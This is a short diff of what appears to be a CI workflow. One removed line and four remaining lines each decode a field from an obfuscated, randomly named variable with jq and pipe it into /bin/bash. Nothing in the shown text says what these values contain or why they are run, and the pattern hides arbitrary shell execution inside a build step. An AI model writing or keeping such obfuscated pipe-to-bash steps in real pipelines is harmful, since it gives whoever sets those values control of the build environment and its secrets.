@@ -21,7 +21,6 @@ jobs:
           echo $j12291 | jq -r .lg0594 | /bin/bash
           echo $hf9 | jq -r .y8045 | /bin/bash
           printf '%s' "$on9314" | jq -r .jlbur94 | /bin/bash
-          printf '%s' "$fw20596" | jq -r .a70771 | /bin/bash
           echo $vygq354 | jq -r .isilk241 | /bin/bash
 
       - name: Archive results
